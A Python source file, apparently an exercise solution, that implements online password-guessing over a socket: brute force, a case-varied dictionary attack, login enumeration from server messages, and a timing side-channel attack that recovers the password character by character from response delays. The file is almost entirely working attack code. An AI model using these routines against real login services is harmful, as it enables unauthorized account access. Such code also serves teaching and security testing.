import socket
from abc import ABC, abstractmethod
from datetime import datetime
from itertools import product
from json import dumps, loads
from string import ascii_letters, ascii_lowercase, digits
from typing import Iterator, List, Optional


ENCODING = "utf-8"
BUFFER_SIZE = 1024
RESULT_FIELD = "result"
RESPONSE_THRESHOLD = 0.1
LOWERCASE_DIGITS = ascii_lowercase + digits
LETTERS_DIGITS = ascii_letters + digits
LOGIN_MISSED = "Wrong login!"
PASSWORD_GUESSED = "Connection success!"
PASSWORD_MISSED = "Wrong password!"
EXCEPTION = "Exception happened during login"
TOO_MANY_ATTEMPTS = "Too many attempts"


class TooManyAttemptsError(Exception):
    def __init__(self):
        super().__init__(TOO_MANY_ATTEMPTS)


class Request:
    def __init__(self, login: str, password: str):
        self.login = login
        self.password = password

    def to_json_str(self) -> str:
        return dumps(self.__dict__)


class AbstractGuesser(ABC):
    def __init__(self, client: socket):
        self._client = client

    @abstractmethod
    def hack_password(self) -> str:
        raise NotImplementedError

    def _send_request(self, message: str) -> str:
        request_data = message.encode(ENCODING)
        self._client.send(request_data)
        response = self._client.recv(BUFFER_SIZE)
        return response.decode(ENCODING)


class PlainTextGuesser(AbstractGuesser, ABC):
    def find_valid_password(self, options: Iterator) -> Optional[str]:
        for pwd in options:
            if self._check_password(pwd):
                return pwd
        return None

    def _check_password(self, password: str) -> bool:
        result = self._send_request(password)
        if result == TOO_MANY_ATTEMPTS:
            raise TooManyAttemptsError
        return result == PASSWORD_GUESSED


class JsonGuesser(AbstractGuesser, ABC):
    def _send_json_request(self, request: Request) -> Optional[str]:
        response = self._send_request(request.to_json_str())
        if response:
            data = loads(response)
            return data.get(RESULT_FIELD)
        return None


class BruteForceGuesser(PlainTextGuesser):
    def hack_password(self) -> str:
        char_count = 0
        while True:
            char_count += 1
            pwd = self.find_valid_password(
                get_bruteforce_iterator(LOWERCASE_DIGITS, char_count)
            )
            if pwd:
                return pwd


class DictionaryGuesser(PlainTextGuesser):
    def __init__(self, client: socket, passwords: List[str]):
        super().__init__(client)
        self._passwords = passwords

    def hack_password(self) -> str:
        for word in self._passwords:
            pwd = self.find_valid_password(get_different_case_iterator(word))
            if pwd:
                return pwd


class BehavioralGuesser(JsonGuesser):
    def __init__(self, client: socket, logins: List[str]):
        super().__init__(client)
        self._logins = logins

    def hack_password(self) -> str:
        login = self._hack_logins()
        if login:
            bruteforcer = BehavioralPasswordGuesser(self._client, login)
            return bruteforcer.hack_password()
        return ""

    def _hack_logins(self) -> Optional[str]:
        request = Request("", "")
        for login in self._logins:
            request.login = login
            result = self._send_json_request(request)
            if result != LOGIN_MISSED:
                return login
        return None


class BehavioralPasswordGuesser(JsonGuesser):
    def __init__(self, client: socket, login: str):
        super().__init__(client)
        self._login = login

    def hack_password(self) -> str:
        request = Request(self._login, "")
        # maybe empty password is OK?
        result = self._guess_letter(request)
        return result.to_json_str() if result else ""

    def _guess_letter(self, request: Request) -> Optional[Request]:
        iterator = get_bruteforce_iterator(LETTERS_DIGITS, 1)
        password_so_far = request.password
        for letter in iterator:
            request.password = password_so_far + letter
            t1 = datetime.now()
            result = self._send_json_request(request)
            t2 = datetime.now()
            if result == PASSWORD_GUESSED:
                return request
            if result == PASSWORD_MISSED:
                delta = t2 - t1
                if delta.total_seconds() >= RESPONSE_THRESHOLD:
                    # delay too long - we guessed a letter
                    return self._guess_letter(request)
        return None


def get_bruteforce_iterator(possible_chars: str, char_count: int) -> Iterator:
    char_generators = [iter(possible_chars) for _ in range(char_count)]
    return ("".join(pwd_chars) for pwd_chars in product(*char_generators))


def get_different_case_iterator(word: str) -> Iterator:
    letter_chains = ((x, x.upper()) if x in ascii_lowercase else (x,)
                     for x in word)
    return ("".join(pwd_chars) for pwd_chars in product(*letter_chains))
